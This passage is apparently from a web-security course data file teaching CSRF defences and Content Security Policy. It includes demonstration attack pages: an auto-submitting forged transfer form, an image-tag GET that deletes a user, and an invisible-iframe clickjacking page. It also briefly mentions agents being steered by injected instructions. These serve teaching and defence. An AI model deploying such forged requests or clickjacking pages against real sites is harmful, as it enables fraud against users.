    '"Is a JSON API with cookies vulnerable?" → yes unless it requires JSON content type + CORS preflight and/or a token',
    '"Sec-Fetch-Site: cross-site" or "Origin header does not match" → reject',
    '"GET request changes data" → bug; use POST/PUT/DELETE'
  ],
  code: [
    {
      lang: 'js', run: true, title: 'A tiny CSRF guard simulation (runs in your browser)',
      code: `// ---- Server side (simulated) ----
var sessions = new Map();          // sessionId -> { user, csrf }
var APP_ORIGIN = 'https://bank.example';

function randomHex(bytes) {
  var a = new Uint8Array(bytes);
  crypto.getRandomValues(a);       // cryptographically secure randomness
  return Array.from(a, function (b) { return b.toString(16).padStart(2, '0'); }).join('');
}
// Compare without returning early at the first wrong character (timing attacks).
function safeEqual(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string' || a.length !== b.length) return false;
  var diff = 0;
  for (var i = 0; i < a.length; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

function login(user) {
  var id = randomHex(16), csrf = randomHex(16);
  sessions.set(id, { user: user, csrf: csrf });
  return { cookieSessionId: id, csrfToken: csrf };    // csrfToken goes into the HTML form
}

// Every state-changing request must pass ALL checks.
function handleTransfer(req) {
  var s = sessions.get(req.cookieSessionId);
  if (!s) return '401 not logged in';
  if (req.origin && req.origin !== APP_ORIGIN) return '403 bad Origin ' + req.origin;
  if (!safeEqual(req.csrfToken, s.csrf)) return '403 missing or wrong CSRF token';
  return '200 transferred ' + req.amount + ' from ' + s.user;
}

var alice = login('alice');

// 1) Alice uses the real site: cookie + token from her page + our Origin.
console.log('real form   :', handleTransfer({ cookieSessionId: alice.cookieSessionId, csrfToken: alice.csrfToken, origin: APP_ORIGIN, amount: 10 }));
// 2) evil.com forges a form post. The browser attaches the cookie (SameSite=None case)
//    and sets Origin to evil.com, but evil.com cannot know Alice's token.
console.log('forged form :', handleTransfer({ cookieSessionId: alice.cookieSessionId, csrfToken: undefined, origin: 'https://evil.example', amount: 5000 }));
// 3) Even a request with no Origin (old browser) is stopped by the token.
console.log('no origin   :', handleTransfer({ cookieSessionId: alice.cookieSessionId, csrfToken: 'guess', amount: 5000 }));`
    },
    {
      lang: 'html', title: 'Form with a hidden token, and the attacker’s page',
      code: `<!-- bank.example/transfer : the REAL form (server fills the token per session) -->
<form method="post" action="/transfer">
  <input type="hidden" name="csrf_token" value="a9f3c0d2e8b14f6a">
  <input name="to"> <input name="amount">
  <button>Send</button>
</form>

<!-- evil.example : the ATTACK page. No valid token, so the server rejects it -->
<form id="f" method="post" action="https://bank.example/transfer">
  <input type="hidden" name="to" value="mallory">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById('f').submit();<\/script>`
    },
    {
      lang: 'js', title: 'SPA: send the token in a header (double-submit)',
      code: `// The server also set a cookie  csrf=<token>; Secure; SameSite=Lax  (NOT HttpOnly, JS must read it).
function getCookie(name) {
  return document.cookie.split('; ').reduce(function (found, kv) {
    var i = kv.indexOf('=');
    return kv.slice(0, i) === name ? decodeURIComponent(kv.slice(i + 1)) : found;
  }, '');
}

async function postJson(url, body) {
  return fetch(url, {
    method: 'POST',
    credentials: 'same-origin',                          // session cookie travels automatically
    headers: {
      'Content-Type': 'application/json',                // forces a CORS preflight cross-site
      'X-CSRF-Token': getCookie('csrf')                  // attacker pages cannot read our cookie
    },
    body: JSON.stringify(body)
  });
}`
    }
  ],
  codeTitle: ['CSRF guard simulation', 'Form and attack page', 'SPA header'],
  viz: {
    title: 'CSRF from evil.com: with and without SameSite / token',
    input: 'none no',
    inputLabel: 'SameSite (none|lax|strict) and anti-CSRF token (token|no). Try: none no, lax no, none token',
    gen: function (input) {
      var p = String(input).trim().toLowerCase().split(/\s+/);
      var ss = p[0] || 'none', tok = (p[1] || 'no') === 'token';
      if (['none', 'lax', 'strict'].indexOf(ss) < 0) throw new Error('First word must be none, lax or strict (second: token or no)');
      var cookieSent = ss === 'none';
      var nodes = [
        { id: 'V', label: 'Victim browser', x: 14, y: 32, shape: 'box', w: 22 },
        { id: 'B', label: 'bank.com', x: 84, y: 10, shape: 'box', w: 20 },
        { id: 'E', label: 'evil.com', x: 84, y: 54, shape: 'box', w: 20 }
      ];
      function g(edge, ehl, tags, hl) {
        return { type: 'graph', label: 'Where the requests go', directed: true, height: 64, nodes: nodes, edges: edge ? [edge] : [], ehl: ehl || {}, tags: tags || {}, hl: hl || {} };
      }
      var frames = [];
      frames.push({
        narr: 'Alice logs in to <b>bank.com</b>. The bank answers with a session cookie: <code>SameSite=' + ss + '</code>. The browser stores it and will attach it to bank.com requests (depending on SameSite).',
        parts: [g(['V', 'B', 'login'], { 'V-B': 'ok' }, { B: 'sets session cookie', V: 'logged in' }, { V: 'ok' }),
          { type: 'code', label: 'Bank response', lang: 'http', code: 'HTTP/1.1 200 OK\nSet-Cookie: sid=PLACEHOLDER; Secure; HttpOnly; SameSite=' + (ss.charAt(0).toUpperCase() + ss.slice(1)) }]
      });
      frames.push({
        narr: 'Without logging out, Alice opens another tab and visits <b>evil.com</b> (a link in an email, a funny-cat page). Nothing suspicious yet.',
        parts: [g(['V', 'E', 'GET /cats'], { 'V-E': 'cur' }, { E: 'attacker page' }, { E: 'bad' })]
      });
      frames.push({
        narr: 'evil.com replies with a page that holds a <b>hidden form</b> pointing at <code>bank.com/transfer</code>, plus one line of JavaScript that submits it on load.',
        parts: [g(['E', 'V', 'hidden auto-submit form'], { 'E-V': 'bad' }, { V: 'runs attacker form' }, { E: 'bad' }),
          { type: 'code', label: 'evil.com page', lang: 'html', code: '<form id="f" method="post"\n  action="https://bank.com/transfer">\n  <input name="to" value="mallory">\n  <input name="amount" value="5000">\n</form>\n<script>f.submit()<\/script>', hl: { 2: 'bad', 6: 'bad' } }]
      });
      frames.push({
        narr: 'The browser sends <code>POST bank.com/transfer</code> (a <b>cross-site</b> request). Does it attach the cookie? ' + (cookieSent ? '<span class="c-r">SameSite=None: yes, always.</span>' : '<span class="c-g">SameSite=' + ss + ': no. Cross-site POSTs never carry the cookie.</span>'),
        parts: [g(['V', 'B', 'POST /transfer' + (cookieSent ? ' + COOKIE' : ' (no cookie)')], { 'V-B': cookieSent ? 'bad' : 'ok' }, { V: cookieSent ? 'attaches cookie' : 'withholds cookie' }, { V: 'cur' }),
          { type: 'code', label: 'Request on the wire', lang: 'http', code: 'POST /transfer HTTP/1.1\nHost: bank.com\nOrigin: https://evil.com\n' + (cookieSent ? 'Cookie: sid=PLACEHOLDER\n' : '') + '\nto=mallory&amount=5000', hl: cookieSent ? { 4: 'bad' } : {} }]
      });
      var outcome, good;
      if (!cookieSent) { outcome = '401 not logged in'; good = true; }
      else if (tok) { outcome = '403 missing CSRF token'; good = true; }
      else { outcome = '200 transferred 5000 to mallory'; good = false; }
      frames.push({
        narr: 'The bank checks the request. ' + (!cookieSent ? 'No cookie means no session, so it answers <b>401</b>. The attack stops here.' : (tok ? 'The cookie is valid, but the form has no <b>anti-CSRF token</b> (evil.com cannot read the real page to copy it), so it answers <b>403</b>.' : '<span class="c-r">The cookie is valid and nothing else is required, so the transfer happens.</span>')),
        parts: [g(['B', 'V', outcome], { 'B-V': good ? 'ok' : 'bad' }, { B: good ? 'rejects' : 'moves the money' }, { B: good ? 'ok' : 'bad' }),
          { type: 'vars', label: 'Verdict', vals: { SameSite: ss, 'CSRF token required': tok ? 'yes' : 'no', 'attack succeeds': good ? 'NO' : 'YES' }, hl: { 'attack succeeds': good ? 'ok' : 'bad' } }]
      });
      frames.push({
        narr: good ? '<span class="c-g">Defended.</span> ' + (cookieSent ? 'The token saved us even though the cookie was sent.' : 'SameSite removed the cookie, so the forged request was anonymous.') + ' Best practice: use <b>both</b>, so one failing layer is not fatal.' : '<span class="c-r">Attack succeeded.</span> Try <code>lax no</code> (cookie withheld) or <code>none token</code> (token blocks it) and compare.',
        parts: [{ type: 'table', label: 'Summary of this run', columns: ['Layer', 'Present?', 'Effect on the forged POST'], rows: [['SameSite=' + ss, ss === 'none' ? 'no protection' : 'yes', cookieSent ? 'cookie attached' : 'cookie withheld'], ['Anti-CSRF token', tok ? 'yes' : 'no', tok ? 'request rejected (403)' : 'not checked']], hl: { 0: cookieSent ? 'bad' : 'ok', 1: tok ? 'ok' : 'bad' } }]
      });
      return frames;
    }
  },
  examples: [
    {
      title: 'The classic: a GET that deletes things',
      html: `<p><code>GET /admin/delete-user?id=7</code> can be triggered by <code>&lt;img src="https://shop.com/admin/delete-user?id=7"&gt;</code> in a forum post or an email. The admin’s browser loads the "image", sends the admin’s cookie (SameSite=Lax would even allow a link click), and the user is gone. <b>Fix:</b> make it <code>POST</code>/<code>DELETE</code> with a CSRF token; keep GET safe (read-only).</p>`
    },
    {
      title: 'JSON API protected only by Content-Type',
      html: `<p>Your API reads <code>req.body</code> and the framework quietly parses <code>text/plain</code> as JSON too. An attacker builds a form with <code>enctype="text/plain"</code> whose body looks like <code>{"to":"mallory","x":"=..."}</code>. A form is a <i>simple request</i>, so no preflight, and the cookie goes along. <b>Fix:</b> strictly require <code>Content-Type: application/json</code> (reject others with 415), keep SameSite, and verify a token or the <code>Origin</code> header.</p>`
    },
    {
      title: 'Subdomain takeover defeats SameSite',
      html: `<p>SameSite looks at <em>site</em>, not origin. If <code>forgotten.shop.com</code> is hijacked (dangling DNS) or has an XSS, then requests from it to <code>shop.com</code> are <b>same-site</b>: Lax and Strict cookies <i>are</i> sent. Only a token, an <code>Origin</code> check (it compares exact origins) or <code>Sec-Fetch-Site: same-origin</code> stops it. Moral: SameSite is a seatbelt, not a vault.</p>`
    },
    {
      title: 'Which check blocks which attack?',
      html: `<p>A quick map to memorise for interviews:</p>
      ${H.table(['Attack', 'SameSite=Lax', 'CSRF token', 'Origin check', 'CORS'], [['evil.com form POST', H.c('g', 'blocks'), H.c('g', 'blocks'), H.c('g', 'blocks'), H.c('r', 'does not apply')], ['evil.com <code>fetch</code> with credentials', H.c('g', 'blocks'), H.c('g', 'blocks'), H.c('g', 'blocks'), H.c('y', 'blocks reading only')], ['Link click GET that changes data', H.c('r', 'sent!'), H.c('g', 'blocks'), H.c('g', 'blocks'), H.c('r', 'n/a')], ['Same-site subdomain attacker', H.c('r', 'sent'), H.c('g', 'blocks'), H.c('g', 'blocks'), H.c('r', 'n/a')], ['XSS on your own site', H.c('r', 'sent'), H.c('r', 'attacker reads token'), H.c('r', 'same origin'), H.c('r', 'same origin')]])}`
    }
  ],
  deepDive: `<p><b>Synchronizer token pattern in detail.</b> At session creation the server makes 128+ bits of random data, stores it in the session, and embeds it in every form and in a <code>&lt;meta name="csrf-token"&gt;</code> for JS. On each unsafe request it compares with a constant-time check. Per-request tokens are stronger but break the back button and multi-tab usage; per-session tokens are the usual balance. Rotate on login and privilege change. Never put the token in a URL (it leaks via Referer and logs) and never accept it from a cookie alone.</p>
  <p><b>Double-submit weaknesses.</b> The naive form ("header equals cookie") fails if an attacker can write cookies for your domain, which happens through a sibling subdomain or a network attacker on HTTP. The robust version signs the token: <code>token = random + '.' + HMAC(secret, sessionId + random)</code>, and the server recomputes it. The <code>__Host-</code> cookie prefix stops sibling subdomains from planting it.</p>
  <p><b>Origin and Fetch Metadata.</b> Browsers send <code>Origin</code> on all cross-origin and all non-GET requests, and <code>Sec-Fetch-Site</code> on every request. A solid modern middleware: allow safe methods; if <code>Sec-Fetch-Site</code> is <code>same-origin</code>, <code>same-site</code> (only if you accept that) or <code>none</code> then allow; if it is missing (old client), fall back to comparing <code>Origin</code>/<code>Referer</code> host with yours; otherwise reject. Note <code>Origin: null</code> can come from privacy redirects or sandboxed frames; reject on state-changing endpoints.</p>
  <p><b>Chrome’s Lax+POST window and why to be explicit.</b> Cookies with no SameSite attribute are treated as Lax in modern browsers, but Chrome kept a short exception (cookies created in the last two minutes are also sent on top-level cross-site POSTs) to avoid breaking SSO flows. Always set <code>SameSite</code> explicitly. SSO/OAuth redirects (POST back from an identity provider) are the legit use cases for <code>None</code>.</p>
  <p><b>Frameworks help, but check the defaults.</b> Django, Rails, Laravel, Spring Security and ASP.NET ship CSRF protection on by default for session auth. Express needs middleware (for example <code>csrf-csrf</code> or <code>csrf-sync</code>), and the older <code>csurf</code> package is deprecated. GraphQL endpoints accepting GET or non-JSON content types need the same care. WebSocket handshakes are cookie-authenticated cross-site by default: check <code>Origin</code> during the upgrade (this is "cross-site WebSocket hijacking").</p>
  <p><b>CSRF vs XSS vs clickjacking.</b> CSRF: attacker sends a request <i>from the victim’s browser</i> but cannot read or see anything. Clickjacking: the victim <i>really clicks</i> on your real page inside the attacker’s frame. XSS: attacker code runs <i>inside</i> your origin. Different defences: tokens/SameSite, <code>frame-ancestors</code>, and escaping/CSP respectively.</p>`,
  aiEra: `<p><b>What AI changes:</b> Agentic browsers and AI assistants that browse for you (they click, submit forms and use your logged-in sessions) widen the old CSRF idea: a malicious page or injected instruction can steer an <b>agent</b> to perform actions with your cookies, no forged form needed. Websites should treat state-changing endpoints as high-value even when called "legitimately" by an automation, and use step-up confirmation (re-auth, explicit confirmation screens) for money, deletion and permission changes. On your side, AI also makes it easy to generate boilerplate login/profile endpoints that forget CSRF protection entirely.</p>
  <p><b>Use AI as a partner:</b> ask <code>List every state-changing route in this Express app and show whether it has SameSite, a CSRF token check and an Origin check. Output a table.</code> Ask it to generate a Playwright test that submits a cross-origin form to your endpoint and expects 403/401.</p>
  <p><b>Where AI goes wrong:</b> it says "we use JWT so CSRF does not apply" even when the JWT is in a cookie; it adds <code>cors({ origin: '*' })</code> believing it fixes CSRF; it generates GET endpoints that mutate state; it implements double-submit with an unsigned token compared with <code>===</code>.</p>
  <p><b>What you must still own:</b> the threat model (where does the credential live and who sends it automatically?), choosing token plus SameSite plus Origin as layers, and testing the forged-request path in an automated test so a refactor cannot silently drop the check.</p>`,
  problems: [{
    title: 'Defend a Form Against CSRF',
    level: 'Medium', tags: ['CSRF', 'tokens', 'Origin check'], companies: ['PayPal', 'Stripe', 'Uber'],
    statement: `<p>Implement a CSRF guard as <code>createGuard(appOrigin)</code> returning <code>{ issue(sessionId), check(req) }</code>. <code>issue</code> creates and remembers a random token for the session and returns it (for the hidden form field). <code>check(req)</code> receives <code>{ method, sessionId, token, origin, secFetchSite }</code> and returns <code>{ ok: boolean, reason: string }</code>. Rules: (1) safe methods <code>GET</code>, <code>HEAD</code>, <code>OPTIONS</code> pass; (2) if <code>secFetchSite</code> is <code>'cross-site'</code> reject; (3) if <code>origin</code> is present and not equal to <code>appOrigin</code> reject; (4) the token must exist for the session and equal the submitted one, compared in constant time.</p>`,
    constraints: `Tokens: at least 128 bits from a secure random source. Do not use <code>Math.random()</code>.`,
    example: `${H.table(['Request', 'Result'], [['GET /page', H.c('g', 'ok: safe method')], ['POST, Sec-Fetch-Site: cross-site', H.c('r', 'reject: cross-site')], ['POST, Origin: https://evil.example', H.c('r', 'reject: bad origin')], ['POST, same origin, no token', H.c('r', 'reject: token missing')], ['POST, same origin, correct token', H.c('g', 'ok')]])}`,
    brute: {
      why: `<p>"The user has a valid session cookie, so allow the POST" is exactly the weakness CSRF exploits: the cookie is attached <em>automatically</em> by the browser, so its presence proves nothing about who initiated the request.</p>`,
      code: `function checkBrute(req, sessions) {
  // Cookie-only check: a forged cross-site form passes, because the browser adds the cookie itself.
  return sessions.has(req.sessionId);
}`
    },
    mcq: { q: 'Why can evil.com NOT simply copy the anti-CSRF token into its forged form?', options: ['Browsers encrypt tokens', 'The Same-Origin Policy stops evil.com from reading the real bank page where the token lives', 'Tokens are only valid for one second', 'Cookies are HttpOnly'], answer: 1, explain: 'The token is in the bank page (or a cookie for the bank). evil.com cannot read cross-origin responses or cookies, so it cannot know the value. XSS would break this, because then the script runs inside the bank origin.' },
    hints: [
      `<p>Hint 1: Put the cheap, non-secret checks first (method, Sec-Fetch-Site, Origin). They fail fast and cannot leak timing information about the token.</p>`,
      `<p>Hint 2: The token must be unpredictable (crypto random) and bound to the session: keep a <code>Map(sessionId → token)</code>. Compare with a loop that XORs all characters instead of <code>===</code>.</p>`,
      `<p>Hint 3: Recipe: <code>if safe method → ok</code>; <code>if secFetchSite === 'cross-site' → reject</code>; <code>if origin &amp;&amp; origin !== appOrigin → reject</code>; <code>expected = tokens.get(sessionId)</code>; <code>if !expected || !safeEqual(expected, token) → reject</code>; else ok.</p>`
    ],
    solution: {
      approach: `<p>Layered checks, cheapest first. The token proves the request came from a page that could read our HTML; the Origin / Sec-Fetch-Site checks add defence in depth for clients that send them. All comparisons that involve secrets use a constant-time function.</p>`,
      code: {
        lang: 'js', run: true, code: `function randomHex(bytes) {
  var a = new Uint8Array(bytes);
  crypto.getRandomValues(a);
  return Array.from(a, function (b) { return b.toString(16).padStart(2, '0'); }).join('');
}
function safeEqual(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string' || a.length !== b.length) return false;
  var d = 0;
  for (var i = 0; i < a.length; i++) d |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return d === 0;
}

function createGuard(appOrigin) {
  var tokens = new Map();   // sessionId -> token
  return {
    issue: function (sessionId) {
      var t = randomHex(16);            // 128 bits
      tokens.set(sessionId, t);
      return t;
    },
    check: function (req) {
      if (['GET', 'HEAD', 'OPTIONS'].indexOf(req.method) !== -1) return { ok: true, reason: 'safe method' };
      if (req.secFetchSite === 'cross-site') return { ok: false, reason: 'cross-site request' };
      if (req.origin && req.origin !== appOrigin) return { ok: false, reason: 'bad Origin' };
      var expected = tokens.get(req.sessionId);
      if (!expected) return { ok: false, reason: 'no token issued for session' };
      if (!safeEqual(expected, req.token)) return { ok: false, reason: 'token missing or wrong' };
      return { ok: true, reason: 'token valid' };
    }
  };
}

var guard = createGuard('https://bank.example');
var tok = guard.issue('sess-1');
console.log(JSON.stringify(guard.check({ method: 'GET', sessionId: 'sess-1' })));
console.log(JSON.stringify(guard.check({ method: 'POST', sessionId: 'sess-1', secFetchSite: 'cross-site' })));
console.log(JSON.stringify(guard.check({ method: 'POST', sessionId: 'sess-1', origin: 'https://evil.example', token: tok })));
console.log(JSON.stringify(guard.check({ method: 'POST', sessionId: 'sess-1', origin: 'https://bank.example' })));
console.log(JSON.stringify(guard.check({ method: 'POST', sessionId: 'sess-1', origin: 'https://bank.example', token: tok })));`
      },
      dry: {
        head: ['Request', 'safe?', 'Sec-Fetch-Site', 'Origin', 'token', 'result'],
        rows: [
          ['GET /page', 'yes', '-', '-', '-', '<span class="c-g">ok</span>'],
          ['POST from evil.com form', 'no', 'cross-site', 'evil', '-', '<span class="c-r">reject</span>'],
          ['POST same origin, correct token', 'no', 'same-origin', 'ok', 'match', '<span class="c-g">ok</span>']
        ]
      },
      complexity: `<p>Each check is O(1); the token comparison is O(token length). Memory O(number of sessions).</p>`,
      followUps: ['How would you make this stateless with an HMAC-signed double-submit cookie?', 'How do you rotate tokens on login?']
    }
  }]
});

/* ============================ TOPIC 6: CSP & CLICKJACKING ============================ */
topics.push({
  title: 'Content Security Policy and Clickjacking Defence',
  analogy: `<p>Think of a <b>bouncer with a guest list</b> standing in front of your page. Without a list, any script from anywhere that gets into the building is allowed to run. With a <b>Content Security Policy (CSP)</b> the bouncer checks every script, image, style, font and network call against the list your server handed over: "scripts only from my own server and from cdn.example.com, and only the ones carrying today’s secret wristband (nonce)". Even if an attacker sneaks a note into your page (XSS), the bouncer says "not on the list" and the script never runs. <b>Clickjacking</b> is a different trick: the attacker puts your real page into a <em>see-through window</em> on top of a fake "Win a prize!" button, so you click your own "Delete account" without knowing. The defence is a rule that says who may put your page in a frame.</p>`,
  explain: `<p>CSP is an HTTP response header, <code>Content-Security-Policy</code>, made of <b>directives</b>. Each directive controls one kind of resource and lists allowed <b>sources</b>.</p>
  ${H.table(['Directive', 'Controls', 'Typical value'], [
    ['<code>default-src</code>', 'Fallback for the directives you did not list', '<code>\'self\'</code>'],
    ['<code>script-src</code>', 'JavaScript: files, inline blocks, event handlers, eval', '<code>\'self\' \'nonce-R4nd0m\'</code>'],
    ['<code>style-src</code>', 'CSS files and inline styles', '<code>\'self\'</code>'],
    ['<code>img-src</code>', 'Images', '<code>\'self\' data: https://images.example.com</code>'],
    ['<code>connect-src</code>', 'fetch, XHR, WebSocket, EventSource targets', '<code>\'self\' https://api.example.com</code>'],
    ['<code>frame-src</code>', 'Pages <em>you</em> embed in iframes', '<code>https://www.youtube.com</code>'],
    ['<code>frame-ancestors</code>', 'Who may embed <em>your</em> page (anti-clickjacking)', '<code>\'none\'</code> or <code>\'self\'</code>'],
    ['<code>object-src</code>', 'Plugins (Flash, applets)', '<code>\'none\'</code>'],
    ['<code>base-uri</code>', 'Allowed values of the <code>&lt;base&gt;</code> tag', '<code>\'none\'</code> or <code>\'self\'</code>'],
    ['<code>form-action</code>', 'Where forms may submit', '<code>\'self\'</code>'],
    ['<code>upgrade-insecure-requests</code>', 'Rewrites http:// subresource URLs to https://', '(no value)']
  ])}
  <h4>Source keywords</h4>
  <ul>
    <li><code>'self'</code> same origin as the page &nbsp;|&nbsp; <code>'none'</code> nothing &nbsp;|&nbsp; <code>https:</code> any https URL &nbsp;|&nbsp; <code>*.example.com</code> subdomains.</li>
    <li><code>'nonce-abc123'</code>: a script tag carrying <code>nonce="abc123"</code> may run. The server makes a fresh random nonce for <b>every response</b>.</li>
    <li><code>'sha256-...'</code>: a script whose hash matches may run (good for static pages).</li>
    <li><code>'strict-dynamic'</code>: scripts that a trusted (nonced) script loads are trusted too, so you do not need long host lists.</li>
    <li>${H.c('r', "'unsafe-inline'")} and ${H.c('r', "'unsafe-eval'")}: turn off the main protection. Avoid.</li>
  </ul>
  <p><b>A good starting policy for a typical site</b> (a "strict CSP"):</p>
  <pre>Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-R4nd0m' 'strict-dynamic';
  style-src 'self';
  img-src 'self' data: https://images.example.com;
  connect-src 'self' https://api.example.com;
  object-src 'none'; base-uri 'none';
  frame-ancestors 'none'; form-action 'self'</pre>
  <p><b>Roll out safely:</b> start with <code>Content-Security-Policy-Report-Only</code> plus a <code>report-to</code> endpoint. The browser logs violations without blocking. Fix them, then switch to enforcing.</p>
  <h4>Clickjacking</h4>
  <p>An attacker loads <code>https://shop.com/settings</code> in an invisible iframe (<code>opacity: 0</code>) and aligns your "Delete account" button under a decoy. Your cookies are sent (the frame is a normal load), and the click is a real user click, so tokens and SameSite do not help. Defences: <code>Content-Security-Policy: frame-ancestors 'none'</code> (or <code>'self'</code>, or a list of partners), and the older <code>X-Frame-Options: DENY | SAMEORIGIN</code> for legacy browsers. JavaScript "frame busters" are bypassable (sandbox attribute, double framing) so do not rely on them.</p>
  ${H.table(['Header', 'Meaning', 'Use'], [['<code>frame-ancestors \'none\'</code>', 'Nobody may frame this page', 'Login, settings, payment pages'], ['<code>frame-ancestors \'self\'</code>', 'Only my own origin', 'Apps that embed their own pages'], ['<code>frame-ancestors https://partner.com</code>', 'Only this partner', 'Embeddable widgets'], ['<code>X-Frame-Options: DENY</code>', 'Same as none (legacy). Ignored when frame-ancestors is present', 'Add both for old browsers']])}`,
  clues: [
    '"Mitigate XSS even if a bug slips through" → CSP with <code>script-src</code> nonce / <code>strict-dynamic</code>',
    '"Prevent my page from being embedded in an iframe" → <code>frame-ancestors</code> (and <code>X-Frame-Options</code>)',
    '"Inline scripts stop working after adding CSP" → move to files, or use nonces/hashes; avoid <code>unsafe-inline</code>',
    '"How do you test a CSP without breaking production?" → <code>Content-Security-Policy-Report-Only</code>',
    '"Third-party scripts (analytics, ads, chat) and CSP" → allow by nonce/<code>strict-dynamic</code> or host, understand the risk',
    '"User clicks something they did not see" → clickjacking / UI redress',
    '"Block mixed content" → <code>upgrade-insecure-requests</code> (and HTTPS everywhere)'
  ],
  code: [
    {
      lang: 'js', run: true, title: 'Build a CSP header from app facts (runs in your browser)',
      code: `// Turn a description of your app into a CSP header string.
function randomNonce() {
  var a = new Uint8Array(16);
  crypto.getRandomValues(a);                      // new value for EVERY response
  return btoa(String.fromCharCode.apply(null, a)); // base64, safe in an attribute
}

function buildCsp(app, nonce) {
  var d = [];
  d.push("default-src 'self'");
  d.push("script-src 'self' 'nonce-" + nonce + "' 'strict-dynamic'");
  d.push("style-src 'self'" + (app.inlineStyles ? " 'unsafe-inline'" : ''));
  d.push("img-src 'self' data:" + (app.imageHosts || []).map(function (h) { return ' ' + h; }).join(''));
  d.push("connect-src 'self'" + (app.apiHosts || []).map(function (h) { return ' ' + h; }).join(''));
  if ((app.frameEmbeds || []).length) d.push('frame-src ' + app.frameEmbeds.join(' '));
  d.push("object-src 'none'", "base-uri 'none'", "form-action 'self'");
  d.push('frame-ancestors ' + ((app.framedBy || []).length ? app.framedBy.join(' ') : "'none'"));
  d.push('upgrade-insecure-requests');
  return d.join('; ');
}

var nonce = randomNonce();
console.log('Content-Security-Policy: ' + buildCsp({
  apiHosts: ['https://api.example.com'],
  imageHosts: ['https://images.example.com'],
  frameEmbeds: ['https://www.youtube.com'],
  framedBy: []
}, nonce));
console.log('');
console.log('<script nonce="' + nonce + '" src="/app.js"><\\/script>');`
    },
    {
      lang: 'js', check: false, title: 'Express + helmet: per-request nonce',
      code: `const crypto = require('crypto');
const helmet = require('helmet');

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');   // fresh every request
  next();
});

app.use(helmet.contentSecurityPolicy({
  useDefaults: false,
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", (req, res) => "'nonce-" + res.locals.cspNonce + "'", "'strict-dynamic'"],
    styleSrc: ["'self'"],
    imgSrc: ["'self'", 'data:'],
    connectSrc: ["'self'", 'https://api.example.com'],
    objectSrc: ["'none'"],
    baseUri: ["'none'"],
    frameAncestors: ["'none'"],
    formAction: ["'self'"]
  },
  reportOnly: false              // start with true while you collect violations
}));
// In the template:  <script nonce="<%= cspNonce %>" src="/app.js"><\/script>`
    },
    {
      lang: 'http', title: 'A full set of security headers',
      code: `HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-R4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Strict-Transport-Security: max-age=31536000; includeSubDomains
Cross-Origin-Opener-Policy: same-origin

# While rolling out, send this instead of the enforcing header:
# Content-Security-Policy-Report-Only: default-src 'self'; report-to csp-endpoint`
    },
    {
      lang: 'html', title: 'Nonce in the page, and a clickjacking test page',
      code: `<!-- Allowed: carries the nonce the header announced -->
<script nonce="R4nd0m" src="/app.js"><\/script>
<!-- Blocked by CSP: injected by an attacker, no nonce -->
<script>stealCookies()<\/script>
<!-- Blocked: inline event handlers are inline script too -->
<button onclick="doIt()">Pay</button>

<!-- Attacker page: your site in an invisible frame over a decoy button -->
<style>
  iframe { position: absolute; inset: 0; opacity: 0.0001; }
  .decoy { position: absolute; top: 230px; left: 120px; }
</style>
<button class="decoy">Win a free phone!</button>
<iframe src="https://shop.example/account/delete"></iframe>`
    }
  ],
  codeTitle: ['buildCsp', 'Express + helmet', 'Security headers', 'Nonce and clickjacking page'],
  viz: {
    title: 'A CSP deciding which resources load',
    input: "default-src 'self'; script-src 'self' https://cdn.example.com 'nonce-r4nd0m'; img-src 'self' https://images.cdn.example; object-src 'none'; frame-ancestors 'none'",
    inputLabel: 'Content-Security-Policy value (page origin is https://app.example.com)',
    gen: function (input) {
      var raw = String(input).trim();
      if (!raw) throw new Error("Type a policy such as: default-src 'self'; script-src 'self'");
      var pol = {}, order = [];
      raw.split(';').forEach(function (d) {
        var t = d.trim().split(/\s+/).filter(Boolean);
        if (!t.length) return;
        var nm = t[0].toLowerCase();
        if (!(nm in pol)) { pol[nm] = t.slice(1); order.push(nm); }
      });
      if (!order.length) throw new Error("Type a policy such as: default-src 'self'; script-src 'self'");
      var PAGE = 'app.example.com';
      var res = [
        { d: '&lt;script src="/static/app.js"&gt;', k: 'script', host: PAGE },
        { d: '&lt;script src="https://cdn.example.com/lib.js"&gt;', k: 'script', host: 'cdn.example.com' },
        { d: '&lt;script src="https://evil.example/x.js"&gt; (injected)', k: 'script', host: 'evil.example' },
        { d: 'inline &lt;script&gt;alert(1)&lt;/script&gt; (injected)', k: 'script', inline: true },
        { d: 'inline &lt;script nonce="r4nd0m"&gt; (yours)', k: 'script', inline: true, nonce: 'r4nd0m' },
        { d: '&lt;button onclick="pay()"&gt; (inline handler)', k: 'script', inline: true, handler: true },
        { d: 'eval("1 + 1")', k: 'script', evalx: true },
        { d: '&lt;img src="https://images.cdn.example/p.png"&gt;', k: 'img', host: 'images.cdn.example' },
        { d: '&lt;style&gt;body{margin:0}&lt;/style&gt; (inline)', k: 'style', inline: true },
        { d: 'fetch("https://api.example.com/data")', k: 'connect', host: 'api.example.com' },
        { d: '&lt;iframe src="https://www.youtube.com/embed/x"&gt;', k: 'frame', host: 'www.youtube.com' }
      ];
      var chain = { script: ['script-src'], style: ['style-src'], img: ['img-src'], connect: ['connect-src'], frame: ['frame-src', 'child-src'] };
      function find(k) {
        var c = chain[k].concat(['default-src']);
        for (var i = 0; i < c.length; i++) if (pol[c[i]]) return { n: c[i], l: pol[c[i]] };
        return null;
      }
      function allows(list, r) {
        if (list.length === 1 && list[0] === "'none'") return false;
        var hasNonce = list.some(function (x) { return x.indexOf("'nonce-") === 0; });
        if (r.evalx) return list.indexOf("'unsafe-eval'") >= 0;
        if (r.inline) {
          if (r.nonce && list.indexOf("'nonce-" + r.nonce + "'") >= 0) return true;
          return list.indexOf("'unsafe-inline'") >= 0 && !hasNonce;
        }
        for (var i = 0; i < list.length; i++) {
          var t = list[i].toLowerCase();
          if (t === '*') return true;
          if (t === "'self'" && r.host === PAGE) return true;
          if (t === 'https:') return true;
